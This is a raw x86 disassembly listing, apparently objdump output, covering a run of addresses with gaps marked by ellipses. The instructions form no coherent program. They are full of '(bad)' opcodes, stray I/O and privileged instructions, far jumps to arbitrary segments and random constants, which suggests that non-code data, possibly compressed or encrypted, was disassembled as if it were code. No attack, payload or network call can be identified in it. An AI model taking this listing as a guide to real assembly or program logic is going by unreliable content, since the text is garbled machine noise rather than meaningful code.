  42421a:	lea    edx,[eax]
  42421c:	xchg   ebp,esi
  42421e:	mov    ds:0xac37447a,eax
  424223:	dec    edx
  424224:	add    dl,BYTE PTR [edi]
  424226:	ss pop ecx
  424228:	(bad)
  42422c:	push   es
  42422d:	or     eax,0x22eeae68
  424232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424233:	out    0xe6,al
  424235:	jns    0x424201
  424237:	stc    
  424238:	addr16 inc ebp
  42423a:	cmc    
  42423b:	fist   DWORD PTR [ebx+0x348291c3]
  424241:	push   edx
  424242:	adc    BYTE PTR [edx+0x1fae65d0],bl
  424248:	mov    es,WORD PTR [eax]
  42424a:	ins    BYTE PTR es:[edi],dx
  42424b:	lds    edx,FWORD PTR [edx+0x678953d9]
  424251:	call   0x8bc31c26
  424256:	inc    edi
  424257:	in     eax,dx
  424258:	jns    0x424295
  42425a:	sbb    dl,BYTE PTR [edi+0x57e697d8]
  424260:	ror    BYTE PTR [ecx],cl
  424262:	ds addr16 sbb al,ah
  424266:	mov    al,0x6f
  424268:	cmp    DWORD PTR ds:0x2d910e,0x0
	...
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	or     al,BYTE PTR [edi+esi*4]
  4242e5:	mov    eax,0x183ba
  4242ea:	inc    DWORD PTR [eax]
  4242ec:	add    BYTE PTR [eax],al
  4242ee:	sbb    al,0x94
  4242f0:	mov    ebx,0x33fbee44
  4242f5:	(bad)  [ecx-0x72]
  4242f8:	push   es
  4242f9:	add    al,0xf
  4242fb:	dec    eax
  4242fc:	push   esp
  4242fd:	and    dh,al
  4242ff:	icebp  
  424300:	out    0x6a,eax
  424302:	mov    dh,BYTE PTR [edx-0x6289082e]
  424308:	les    esp,FWORD PTR [ecx+esi*2+0x31]
  42430c:	xchg   ch,dl
  42430e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42430f:	fadd   DWORD PTR [ebp+0x70]
  424312:	test   BYTE PTR [esi],bl
  424314:	rcr    BYTE PTR [edi+eax*1],1
  424317:	rcr    BYTE PTR [esi+0x4f],cl
  42431a:	xchg   ebp,eax
  42431b:	xchg   edi,eax
  42431c:	nop
  42431d:	inc    esi
  42431e:	daa    
  42431f:	add    al,0x41
  424321:	lods   al,BYTE PTR ds:[esi]
  424322:	not    BYTE PTR [ebp-0x5514eab0]
  424328:	outs   dx,BYTE PTR ds:[esi]
  424329:	push   0x2d74e4f1
  42432e:	mov    eax,0x632c2cd5
  424333:	mov    al,0x9e
  424335:	inc    edx
  424336:	call   0x9754ed6b
  42433b:	in     al,dx
  42433c:	xor    al,0x82
  42433e:	mov    ecx,0x8757cdfa
  424343:	into   
  424344:	inc    ebx
  424345:	sbb    ecx,esi
  424347:	and    al,0x79
  424349:	mov    edi,0x883d3776
  42434e:	pop    edx
  42434f:	mov    bh,0x5b
  424351:	push   0x5d7d45e3
  424356:	mov    ch,al
  424358:	push   esp
  424359:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42435b:	aam    0x4f
  42435d:	pop    ds
  42435e:	adc    esi,DWORD PTR [ebx-0x22]
  424361:	mov    es,WORD PTR [ebx-0x18e4187e]
  424367:	fidiv  WORD PTR [ecx-0x1d51a210]
  42436d:	ins    DWORD PTR es:[edi],dx
  42436e:	cmp    eax,0xb36855f5
  424373:	retf   
  424374:	retf   0xdead
  424377:	setne  BYTE PTR [ecx]
  42437a:	sub    cl,0xa6
  42437d:	mov    cl,0x2d
  42437f:	(bad)  
  424380:	lds    eax,FWORD PTR [esi+eax*4+0x6acf19a9]
  424387:	or     eax,0x35997a75
  42438c:	mov    esp,DWORD PTR [edx+edx*4-0x2]
  424390:	dec    esp
  424391:	jae    0x4243c9
  424393:	je     0x424366
  424395:	dec    edx
  424396:	mov    cl,0x40
  424398:	inc    ebx
  424399:	fwait
  42439a:	test   BYTE PTR ds:0xc6b8a18d,cl
  4243a0:	shl    ah,1
  4243a2:	adc    al,0x48
  4243a4:	add    eax,0xeaaa4c04
  4243a9:	xchg   ecx,eax
  4243aa:	test   bl,ah
  4243ac:	dec    edi
  4243ad:	pop    esp
  4243ae:	arpl   WORD PTR [esi],bp
  4243b0:	cld    
  4243b1:	imul   ebx,edx,0x7009fc24
  4243b7:	cmc    
  4243b8:	cwde   
  4243b9:	xor    DWORD PTR [edi-0xb],esi
  4243bc:	add    DWORD PTR [eax+ebx*8-0x24],esp
  4243c0:	pop    ebp
  4243c1:	xor    eax,0xddb162bb
  4243c6:	je     0x4243c7
  4243c8:	(bad)  
  4243c9:	xor    eax,0x91ac9e8c
  4243ce:	fild   DWORD PTR [ecx]
  4243d0:	mov    bl,0x6a
  4243d2:	stos   DWORD PTR es:[edi],eax
  4243d3:	dec    ebx
  4243d4:	fimul  DWORD PTR [ebp+0x73ba74c7]
  4243da:	(bad)  
  4243db:	sbb    eax,0x183eb5a1
  4243e0:	sbb    DWORD PTR [edx-0x5f],edi
  4243e3:	pop    edx
  4243e4:	mov    al,0xad
  4243e6:	sub    BYTE PTR [ebx+ecx*2],ah
  4243e9:	dec    esi
  4243ea:	stos   DWORD PTR es:[edi],eax
  4243eb:	pop    ebx
  4243ec:	push   0x0
	...
  424455:	add    BYTE PTR [edx-0x24582da],cl
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x4244aa
  424463:	icebp  
  424464:	(bad)
  424468:	add    DWORD PTR [eax],eax
  42446a:	inc    DWORD PTR [eax]
  42446c:	add    BYTE PTR [eax],al
  42446e:	imul   esp,DWORD PTR [edi],0x18e8b846
  424474:	or     eax,0xb2ad2942
  424479:	xchg   ebp,eax
  42447a:	(bad)  
  42447b:	test   al,0x27
  42447d:	neg    edx
  42447f:	pop    eax
  424480:	add    dl,BYTE PTR [ecx-0x7367785c]
  424486:	sub    bl,cl
  424488:	sub    al,0xf3
  42448a:	lock xor ah,bl
  42448d:	xchg   edi,eax
  42448e:	pop    ebp
  42448f:	into   
  424490:	lahf   
  424491:	int3   
  424492:	(bad)  
  424493:	mov    ch,0xfc
  424495:	xchg   esi,eax
  424496:	mov    eax,0x60f08150
  42449b:	daa    
  42449c:	cli    
  42449d:	fmul   DWORD PTR [ebx]
  42449f:	cs das 
  4244a1:	cmp    al,0xd8
  4244a3:	push   esp
  4244a4:	adc    al,dh
  4244a6:	into   
  4244a7:	cwde   
  4244a8:	xchg   esp,eax
  4244a9:	je     0x424438
  4244ab:	pop    eax
  4244ac:	mov    esi,0x5a868135
  4244b1:	repz popa 
  4244b3:	in     eax,0xf4
  4244b5:	jmp    0x42451e
  4244b7:	or     cl,ch
  4244b9:	add    dh,BYTE PTR es:[eax+edi*4+0x5df248b]
  4244c1:	mov    eax,0x6fdb239b
  4244c6:	cwde   
  4244c7:	mov    al,0x40
  4244c9:	mov    esi,0xb940207d
  4244ce:	ss es dec esp
  4244d1:	pop    ebp
  4244d2:	idiv   ecx
  4244d4:	daa    
  4244d5:	and    eax,0x49b65c6a
  4244da:	jno    0x4244a4
  4244dc:	and    DWORD PTR [ebx],0xe9bc500
  4244e2:	hlt    
  4244e3:	retf   0x3fb1
  4244e6:	dec    ebx
  4244e7:	pushf  
  4244e8:	jg     0x4244ff
  4244ea:	mov    eax,ds:0xf36b5cad
  4244ef:	fsubr  st,st(6)
  4244f1:	stos   DWORD PTR es:[edi],eax
  4244f2:	lods   eax,DWORD PTR ds:[esi]
  4244f3:	sub    ch,BYTE PTR ds:0x6cac12b1
  4244f9:	pop    esp
  4244fa:	sub    al,0x9
  4244fc:	push   edi
  4244fd:	call   0x98945b82
  424502:	daa    
  424503:	xor    cl,BYTE PTR [ecx+0x7f]
  424506:	lds    edi,FWORD PTR [esp+eax*1-0x3]
  42450a:	xor    al,0xa4
  42450c:	vmread DWORD PTR [edi-0x4d6c5e8b],eax
  424513:	mov    ebp,0x41f6afdb
  424518:	jne    0x4244fe
  42451a:	dec    edx
  42451b:	sub    DWORD PTR [eiz*8+0x272c985c],ebx
  424522:	test   BYTE PTR [eax-0x62],dl
  424525:	sub    eax,0xf9e3675a
  42452a:	xor    esp,edi
  42452c:	sub    al,0x7
  42452e:	mov    ebp,0xd8276c68
  424533:	sub    edx,DWORD PTR ds:0xaaef84e0
  424539:	fsubr  QWORD PTR [edx]
  42453b:	add    DWORD PTR [edx+0x52],eax
  42453e:	push   ebp
  42453f:	scas   eax,DWORD PTR es:[edi]
  424540:	sub    DWORD PTR [edx],eax
  424542:	int3   
  424543:	sahf   
  424544:	push   esi
  424545:	mov    DWORD PTR [eax+0x1d6b2586],ebx
  42454b:	mov    BYTE PTR [edi],ah
  42454d:	outs   dx,DWORD PTR ds:[esi]
  42454e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42454f:	inc    ebx
  424550:	(bad)  
  424551:	stos   DWORD PTR es:[edi],eax
  424552:	popa   
  424553:	fidivr WORD PTR [edi]
  424555:	jge    0x4245ba
  424557:	out    dx,eax
  424558:	test   edi,edx
  42455a:	mov    WORD PTR [edx-0x475f2b4e],?
  424560:	retf   
  424561:	jmp    0x3281:0xdd2767cd
  424568:	sub    BYTE PTR [edi+0xa2869b],0x0
	...
  4245d3:	add    BYTE PTR [eax],al
  4245d5:	add    al,ah
  4245d7:	outs   dx,DWORD PTR ds:[esi]
  4245d8:	xchg   esi,eax
  4245d9:	inc    edx
  4245da:	lahf   
  4245db:	sti    
  4245dc:	hlt    
  4245dd:	out    dx,eax
  4245de:	dec    eax
  4245df:	rol    DWORD PTR [esp+ebx*4+0x48],1
  4245e3:	out    0xc1,al
  4245e5:	xchg   DWORD PTR [eax-0xfffe7b],edi
  4245eb:	add    BYTE PTR [eax],al
  4245ed:	add    BYTE PTR [edx+0x6aacd06e],bh
  4245f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245f4:	sbb    eax,0x41df09b8
  4245f9:	lahf   
  4245fa:	(bad)
  4245fe:	dec    esi
  4245ff:	stos   DWORD PTR es:[edi],eax
  424600:	iret   
  424601:	jns    0x42462f
  424603:	and    BYTE PTR [ebp-0x25],bh
  424606:	and    ecx,ebx
  424608:	pop    edi
  424609:	mov    eax,ds:0x2f27be21
  42460e:	test   eax,0x6e9079d3
  424613:	and    DWORD PTR [edi+0x58],esp
  424616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424617:	shl    bh,0x64
  42461a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42461b:	mov    edi,0x6fa6680f
  424620:	sahf   
  424621:	(bad)  
  424622:	cld    
  424623:	sbb    al,BYTE PTR [eax]
  424625:	push   0xdecab239
  42462a:	xor    bh,BYTE PTR [ebp-0x5c8acd1f]
  424630:	pop    esi
  424631:	push   ss
  424632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424633:	mov    edi,?
  424635:	sahf   
  424636:	push   ds
  424637:	cwde   
  424638:	call   0x29710668
  42463d:	es xchg esp,eax
  42463f:	and    BYTE PTR [ebx+edx*8-0x2b],bl
  424643:	xchg   esi,eax
  424644:	ins    BYTE PTR es:[edi],dx
  424645:	cmp    eax,0x19b9b1a7
  42464a:	inc    esp
  42464b:	jmp    0x4bd1:0x9d476a5c
  424652:	mov    dl,0x6a
  424654:	and    DWORD PTR [edi+0x10],ebp
  424657:	sahf   
  424658:	pop    ebx
  424659:	xor    DWORD PTR [edi],edi
  42465b:	ficom  DWORD PTR [ebp+0x1f]
  42465e:	dec    BYTE PTR [ecx]
  424660:	jno    0x424654
  424662:	jne    0x424660
  424664:	in     al,0xea
  424666:	xor    BYTE PTR [ecx+0x10],0x9a
  42466a:	xor    BYTE PTR [edi+ebx*2-0x23],bh
  42466e:	jmp    0x424640
  424670:	or     eax,0x64d6ab05
  424675:	push   ss
  424676:	sbb    BYTE PTR [edi],ch
  424678:	mov    edx,0x6ad90dab
  42467d:	xchg   BYTE PTR [ecx],cl
  42467f:	loope  0x4246e6
  424681:	push   ebp
  424682:	test   BYTE PTR [ebp+0x52aa8395],al
  424688:	adc    cl,0x27
  42468b:	loopne 0x42468d
  42468d:	adc    BYTE PTR [eax-0x6d],ch
  424690:	jne    0x424637
  424692:	jmp    0x424698
  424694:	jecxz  0x42461a
  424696:	in     eax,0x3d
  424698:	repz push ecx
  42469a:	pusha  
  42469b:	push   ebp
  42469c:	push   0xc
  42469e:	mov    BYTE PTR [esp+esi*2-0x6d],ah
  4246a2:	je     0x42470e
  4246a4:	jb     0x42463d
  4246a6:	xlat   BYTE PTR ds:[ebx]
  4246a7:	push   ds
  4246a8:	daa    
  4246a9:	or     dh,BYTE PTR [edx]
  4246ab:	mov    dl,BYTE PTR [edi]
  4246ad:	arpl   WORD PTR [edx],sp
  4246af:	mov    dl,BYTE PTR [ebp+0x427312c9]
  4246b5:	test   eax,0x8af918dd
  4246ba:	jg     0x42464d
  4246bc:	inc    edi
  4246bd:	ins    BYTE PTR es:[edi],dx
  4246be:	xor    al,0x6e
  4246c0:	xchg   esp,eax
  4246c1:	xchg   ebp,esi
  4246c3:	in     eax,dx
  4246c4:	cmp    esi,edx
  4246c6:	imul   BYTE PTR ds:0x647d221c
  4246cc:	fcmovnbe st,st(2)
  4246ce:	(bad)  
  4246cf:	mov    edi,0x88633f7b
  4246d4:	popf   
  4246d5:	and    dh,BYTE PTR [edi]
  4246d7:	(bad)  
  4246d9:	xor    al,0x1a
  4246db:	mov    dh,0x42
  4246dd:	ret    0xebdf
  4246e0:	fidiv  DWORD PTR [eax+0x6de76b87]
  4246e6:	imul   edi,DWORD PTR [ecx+0x39],0xe91b24ff
	...
  424755:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42475c:	mov    edi,0xb298dbd3
  424761:	mov    al,al
  424763:	loop   0x424716
  424765:	into   
  424766:	mov    bh,0x86
  424768:	add    DWORD PTR [eax],eax
  42476a:	inc    DWORD PTR [eax]
  42476c:	add    BYTE PTR [eax],al
  42476e:	xor    eax,DWORD PTR [edi+edx*2]
  424771:	scas   eax,DWORD PTR es:[edi]
  424772:	xor    edx,DWORD PTR [edx-0x763de680]
  424778:	jp     0x424767
  42477a:	jns    0x4247f8
  42477c:	sbb    BYTE PTR [edx+0x5d],cl
  42477f:	jmp    0x12e5:0xf9780daf
  424786:	aas    
  424787:	xor    al,0xa1
  424789:	cmc    
  42478a:	push   ss
  42478b:	xchg   edi,eax
  42478c:	mov    ebx,0xdb3eb79b
  424791:	xchg   esp,eax
  424792:	dec    eax
  424793:	mov    ebx,0xdcc81a4c
  424798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424799:	mov    ah,0x7d
  42479b:	jp     0x424768
  42479d:	ins    DWORD PTR es:[edi],dx
  42479e:	cli    
  42479f:	jle    0x4247b6
  4247a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247a2:	cs sub cl,cl
  4247a5:	jecxz  0x424735
  4247a7:	add    eax,ebp
  4247a9:	cmp    BYTE PTR [eax],al
  4247ab:	cli    
  4247ac:	jnp    0x424791
  4247ae:	std    
  4247af:	xchg   ecx,eax
  4247b0:	(bad)  
  4247b1:	call   0x4c8e:0x8f9d5c53
  4247b8:	adc    ebp,ebx
  4247ba:	cmp    ecx,eax
  4247bc:	repnz mov esi,DWORD PTR [edx+0x7e]
  4247c0:	ja     0x42476a
  4247c2:	(bad)  
  4247c3:	scas   eax,DWORD PTR es:[edi]
  4247c4:	push   ecx
  4247c5:	push   edi
  4247c6:	push   ecx
  4247c7:	push   eax
  4247c8:	sub    dh,bh
  4247ca:	xor    dh,0x1
  4247cd:	push   es
  4247ce:	mov    al,cs:0xb50cd2ac
  4247d4:	retf   
  4247d5:	mov    al,0x23
  4247d7:	jmp    0x97745088
  4247dc:	jns    0x4247aa
  4247de:	add    ch,dh
  4247e0:	xchg   edi,eax
  4247e1:	mov    cl,0x27
  4247e3:	sbb    DWORD PTR [edi],ebp
  4247e5:	mov    bl,0x9d
  4247e7:	xor    eax,0x9af9a9fb
  4247ec:	es xchg ecx,eax
  4247ee:	retf   
  4247ef:	pusha  
  4247f0:	cmp    ch,ah
  4247f2:	ja     0x424814
  4247f4:	sbb    DWORD PTR [eax+edx*2],ebp
  4247f7:	ret    0x78f2
  4247fa:	dec    ecx
  4247fb:	inc    edx
  4247fc:	fsubr  DWORD PTR [edi+0x7a]
  4247ff:	ja     0x424874
  424801:	test   DWORD PTR [edi+0x54d1b362],ebp
  424807:	aaa    
  424808:	out    dx,al
  424809:	mov    BYTE PTR [ebp+0x4a],dl
  42480c:	mov    edx,0x80eb814c
  424811:	inc    ecx
  424812:	sbb    DWORD PTR [ebx],eax
  424814:	push   ds
  424815:	mov    BYTE PTR [edi+0x7d1ac68d],bh
  42481b:	loop   0x424894
  42481d:	cmc    
  42481e:	xchg   BYTE PTR [esi+0x31],bh
  424821:	leave  
  424822:	mov    BYTE PTR [ebp+edx*4+0x1c],cl
  424826:	xchg   ecx,eax
  424827:	mov    al,0x1e
  424829:	lds    ecx,FWORD PTR [eax]
  42482b:	cmc    
  42482c:	and    ah,dl
  42482e:	pop    esi
  42482f:	out    0x5b,eax
  424831:	stos   DWORD PTR es:[edi],eax
  424832:	push   esp
  424833:	scas   al,BYTE PTR es:[edi]
  424834:	mov    ds:0xeea4d9b1,al
  424839:	adc    al,0x86
  42483b:	push   ebp
  42483c:	sbb    DWORD PTR [ecx-0x2628e79a],0x12
  424843:	retf   
  424844:	jo     0x424887
  424846:	jge    0x424858
  424848:	in     al,dx
  424849:	scas   eax,DWORD PTR es:[edi]
  42484a:	push   esp
  42484b:	sbb    al,0x63
  42484d:	mov    edi,0xf061c658
  424852:	popa   
  424853:	fstp   QWORD PTR [ecx]
  424855:	stc    
  424856:	bound  esi,QWORD PTR [esi+0x3b87cbd5]
  42485c:	lds    eax,FWORD PTR [eax-0x78ac4861]
  424862:	call   0x9e88cd28
  424867:	arpl   WORD PTR [edi+eax*8+0xaa2d9],di
	...
  4248d6:	and    bl,BYTE PTR [eax-0x7c]
  4248d9:	out    dx,eax
  4248da:	(bad)  
  4248db:	jmp    FWORD PTR [ebx-0x23]
  4248de:	lock test BYTE PTR [ebx],dl
  4248e1:	xchg   esp,eax
  4248e2:	inc    ecx
  4248e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248e4:	jmp    0xff00:0x187b6d6
  4248eb:	add    BYTE PTR [eax],al
  4248ed:	add    BYTE PTR [ebx-0x31a6fb50],bl
  4248f3:	loopne 0x4248ca
  4248f5:	call   FWORD PTR [ebx-0x6124b572]
  4248fb:	xchg   ebp,eax
  4248fc:	xor    eax,0x6225c55c
  424901:	pop    esp
  424902:	in     eax,dx
  424903:	sahf   
  424904:	xor    eax,0xda8fb6f8
  424909:	fst    QWORD PTR [eax+eax*2+0x63]
  42490d:	sub    ch,ah
  42490f:	xchg   esi,eax
  424910:	push   ds
  424911:	pop    eax
  424912:	call   0xb02b:0x621a4f9d
  424919:	xor    edx,edi
  42491b:	out    0x3e,al
  42491d:	(bad)  
  42491e:	jecxz  0x42494a
  424920:	xchg   ecx,eax
  424921:	xor    al,0xc9
  424923:	les    esi,FWORD PTR [ebp+0xe7e552c]
  424929:	(bad)  
  42492a:	loopne 0x4248c8
  42492c:	(bad)
  42492f:	pop    esp
  424930:	out    dx,al
  424931:	jge    0x4248e2
  424933:	jno    0x424936
  424935:	in     eax,0x59
  424937:	or     eax,0x7f50cd4a
  42493c:	ja     0x42496b
  42493e:	retf   0xe656
  424941:	(bad)  
  424943:	and    DWORD PTR [ebx-0x49f432],0x3a1a0ffa
  42494d:	sbb    bl,BYTE PTR [edi+ecx*4+0xb]
  424951:	jb     0x424966
  424953:	or     DWORD PTR [edi],ebp
  424955:	inc    eax
  424956:	sbb    al,0xbe
  424958:	jno    0x424995
  42495a:	mov    bh,0x19
  42495c:	dec    edx
  42495d:	jmp    0x6298:0xd19c8734
  424964:	xlat   BYTE PTR ds:[ebx]
  424965:	xchg   edi,eax
  424966:	jb     0x424991
  424968:	or     dh,dh
  42496a:	xor    al,0x40
  42496c:	mov    ds:0x84410126,eax
  424971:	add    DWORD PTR [ecx-0x2a],edx
  424974:	leave  
  424975:	icebp  
  424976:	enter  0x2626,0xea
  42497a:	or     eax,0xdc9c01b
  42497f:	icebp  
  424980:	loop   0x424949
  424982:	push   esi
  424983:	dec    edi
  424984:	inc    esp
  424985:	push   ss
  424986:	add    edi,esp
  424988:	aam    0xe2
  42498a:	outs   dx,BYTE PTR ds:[esi]
  42498b:	mov    edx,0x55de49f7
  424990:	imul   ebp,DWORD PTR [ebx-0x75ca0bad],0x10b6219b
  42499a:	push   ds
  42499b:	int3   
  42499c:	jno    0x42498f
  42499e:	jae    0x42494a
  4249a0:	push   es
  4249a1:	pushf  
  4249a2:	cs mov ebp,edx
  4249a5:	ror    DWORD PTR [ebp+0x327a7be2],cl
  4249ab:	push   ss
  4249ac:	fstp   QWORD PTR [esi]
  4249ae:	test   BYTE PTR [edi-0x18a141d8],bl
  4249b4:	push   edi
  4249b5:	sub    ebp,esp
  4249b7:	ins    BYTE PTR es:[edi],dx
  4249b8:	cmp    DWORD PTR [eax+0x6baff2e2],0xee47a1c5
  4249c2:	in     eax,0x7
  4249c4:	aam    0x6b
  4249c6:	(bad)  
  4249c8:	test   al,0x8c
  4249ca:	or     ecx,ebx
  4249cc:	push   ebx
  4249cd:	pop    ebp
  4249ce:	call   DWORD PTR ds:0x3c99f57a
  4249d4:	popa   
  4249d5:	mov    eax,0x97dda590
  4249da:	dec    ecx
  4249db:	cmp    dl,bl
  4249dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249de:	repnz push es
  4249e0:	call   0xe93b:0xfd3b2e7a
  4249e7:	mov    esi,0xcff63ce5
  4249ec:	in     al,0x0
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    dl,BYTE PTR [edi-0x32]
  424a64:	outs   dx,DWORD PTR ds:[esi]
  424a65:	adc    eax,0x188b5
  424a6a:	inc    DWORD PTR [eax]
  424a6c:	add    BYTE PTR [eax],al
  424a6e:	ds push ebx
  424a70:	popf   
  424a71:	lea    ebx,[ebx+0x722c56e7]
  424a77:	inc    ebx
  424a79:	ror    edi,cl
  424a7b:	xchg   DWORD PTR [ecx+0x52131dd],edx
  424a81:	jecxz  0x424ad8
  424a83:	hlt    
  424a84:	add    al,0xff
  424a86:	fucomp st(1)
  424a88:	xor    BYTE PTR [ebx-0x78],dl
  424a8b:	cmpxchg DWORD PTR [ecx-0x7d],esi
  424a8f:	add    DWORD PTR [ebx],ebp
  424a91:	jmp    0x424adb
  424a93:	or     eax,0x11f4213d
  424a98:	adc    al,BYTE PTR [edx+0x34]
  424a9b:	adc    edi,edx
  424a9d:	clc    
  424a9e:	pusha  
  424a9f:	enter  0x5a24,0x61
  424aa3:	(bad)  
  424aa4:	repz mov bh,0xc9
  424aa7:	add    BYTE PTR [ebx],cl
  424aa9:	push   es
  424aaa:	inc    edx
  424aab:	adc    ah,BYTE PTR [ebx-0x6507b54b]
  424ab1:	mov    DWORD PTR [ebp-0x35],ebx
  424ab4:	cmp    ah,ch
  424ab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ab7:	push   ebp
  424ab8:	ss test eax,0xb70218fa
  424abe:	sahf   
  424abf:	mul    BYTE PTR [esi+ecx*1]
  424ac2:	pushw  cs
  424ac4:	jo     0x424a5f
  424ac6:	stc    
  424ac7:	mov    ebp,0x6106243c
  424acc:	xchg   DWORD PTR ds:[ebp+0x55],edi
  424ad0:	mov    eax,eax
  424ad2:	into   
  424ad3:	jns    0x424ab7
  424ad5:	inc    ebx
  424ad6:	jecxz  0x424a75
  424ad8:	add    edx,DWORD PTR [edi-0x70]
  424adb:	sub    al,0x9d
  424add:	xchg   ecx,eax
  424ade:	add    DWORD PTR [edx+0x2d],esi
  424ae1:	mov    ds:0xf1ff2fe8,eax
  424ae6:	les    edx,FWORD PTR [esi+0x2619fd7f]
  424aec:	mov    BYTE PTR [ebx+0x2a7f7432],cl
  424af2:	and    eax,0x226c47c0
  424af7:	mov    esp,esp
  424af9:	mov    edx,0x5ac64f5
  424afe:	jnp    0x424b3a
  424b00:	dec    eax
  424b01:	xor    esi,0xb8e613a7
  424b07:	or     DWORD PTR [edx+esi*1-0x32],0x458e6d79
  424b0f:	out    0xb9,eax
  424b11:	fisubr WORD PTR [ecx]
  424b13:	ret    
  424b14:	or     edx,DWORD PTR [edx-0x3d]
  424b17:	sub    edx,DWORD PTR [edx]
  424b19:	add    DWORD PTR [edx+0x3e7df684],ebx
  424b1f:	mov    BYTE PTR [edi],bl
  424b21:	push   es
  424b22:	pop    edi
  424b23:	inc    ecx
  424b24:	jle    0x424b33
  424b26:	gs push 0x444e3c2d
  424b2c:	or     ah,BYTE PTR [ecx+edx*8+0x78d738b]
  424b33:	pop    eax
  424b34:	test   al,0x87
  424b36:	mov    WORD PTR [edx+ebp*4-0x7b92f18a],fs
  424b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b3e:	push   0x69
  424b40:	ja     0x424b03
  424b42:	popa   
  424b43:	adc    DWORD PTR [ecx-0x1f],edi
  424b46:	fisttp DWORD PTR [ebx]
  424b48:	adc    al,0x66
  424b4a:	push   edx
  424b4b:	adc    BYTE PTR [eax],0x58
  424b4e:	and    al,0x44
  424b50:	mov    cl,0x31
  424b52:	sub    BYTE PTR [ecx-0x59],cl
  424b55:	jo     0x424b7b
  424b57:	fld    st(7)
  424b59:	(bad)  
  424b5a:	dec    edx
  424b5b:	sub    ebp,ecx
  424b5d:	inc    ebx
  424b5e:	add    edi,DWORD PTR [esi+0x3fa6a2e]
  424b64:	aas    
  424b65:	ds imul ecx
  424b68:	push   edi
  424b69:	mov    ah,0x78
  424b6b:	sub    eax,0xb0
	...
  424bd4:	add    BYTE PTR [eax],al
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	popa   
  424be3:	je     0x424bea
  424be5:	les    esi,FWORD PTR [ecx+ecx*4+0xff0001]
  424bec:	add    BYTE PTR [eax],al
  424bee:	add    esi,DWORD PTR [ecx+0x38]
  424bf1:	mov    bh,0xa8
  424bf3:	mov    ebx,0x2cf5334
  424bf8:	mov    ch,0xb4
  424bfa:	mov    ch,0x9c
  424bfc:	dec    edx
  424bfd:	mov    edi,0x1ad4d322
  424c02:	pop    esi
  424c03:	ret    
  424c04:	fdivr  DWORD PTR [ebx-0x2b9654cf]
  424c0a:	lds    esi,FWORD PTR [edi-0x1c]
  424c0d:	or     eax,0xac82a5d7
  424c12:	in     al,0xe8
  424c14:	mov    ah,0x5b
  424c16:	or     DWORD PTR [ecx-0x3a],esi
  424c19:	jne    0x424c50
  424c1b:	push   eax
  424c1c:	ja     0x424c7c
  424c1e:	jo     0x424bd1
  424c20:	xchg   ecx,eax
  424c21:	add    eax,0xe8a18eb8
  424c26:	inc    edx
  424c27:	call   0x5563:0x8a80250d
  424c2e:	jmp    0x424c88
  424c30:	inc    esp
  424c31:	mov    ebx,0x65fea0b0
  424c36:	ds jmp 0x424c65
  424c39:	sbb    eax,0x4d08b5c2
  424c3e:	shr    BYTE PTR [edx+ebp*1+0x6f],0x44
  424c43:	cmp    esp,DWORD PTR [esi]
  424c45:	xor    al,bl
  424c47:	pop    ss
  424c48:	pop    ds
  424c49:	jb     0x424c1c
  424c4b:	inc    eax
  424c4c:	sbb    BYTE PTR [esi+0x70],ah
  424c4f:	pushf  
  424c50:	frstor [ebx-0x4]
  424c53:	sbb    eax,edx
  424c55:	test   eax,0x1410176f
  424c5a:	stc    
  424c5b:	popa   
  424c5c:	or     al,0x3e
  424c5e:	test   BYTE PTR [ebx+ebp*2],dh
  424c61:	mov    BYTE PTR [edx],0xb2
  424c64:	mov    esi,0x1c20d5a6
  424c69:	cmp    bl,al
  424c6b:	xchg   esi,eax
  424c6c:	mov    BYTE PTR [edx-0x63],dh
  424c6f:	es in  al,dx
  424c71:	(bad)  
  424c72:	rol    bh,cl
  424c74:	jne    0x424cb4
  424c76:	xor    eax,DWORD PTR [ebx+0x55]
  424c79:	test   BYTE PTR [ebp+0x4f481b5b],ch
  424c7f:	push   0xffffffe1
  424c81:	imul   esi,DWORD PTR [esp+esi*8-0x77],0xffffffed
  424c86:	cmp    DWORD PTR [edx+0x7d0abf81],ebp
  424c8c:	adc    DWORD PTR [ecx-0x22],ecx
  424c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c90:	es xor esi,edi
  424c93:	iret   
  424c94:	mov    al,ds:0x157a8703
  424c99:	lock cmp eax,0xca764eea
  424c9f:	shr    BYTE PTR [edi+eiz*8-0x4],1
  424ca3:	(bad)  [esp+edi*1-0x14]
  424ca7:	cmp    bh,BYTE PTR [ebx+0x53950e98]
  424cad:	stos   BYTE PTR es:[edi],al
  424cae:	jmp    0x6162f965
  424cb3:	mov    ds:0x292d2f1d,eax
  424cb8:	inc    esp
  424cb9:	mov    WORD PTR [ebx-0x11],gs
  424cbc:	inc    edx
  424cbd:	fisttp WORD PTR [eax]
  424cbf:	or     BYTE PTR [esi-0x119cd055],dh
  424cc5:	cwde   
  424cc6:	sub    ebp,DWORD PTR [eax-0x47e28cec]
  424ccc:	call   DWORD PTR [esi-0x76]
  424ccf:	lods   al,BYTE PTR ds:[esi]
  424cd0:	mov    al,ds:0xcc3b5798
  424cd5:	cmp    esi,0x222e11db
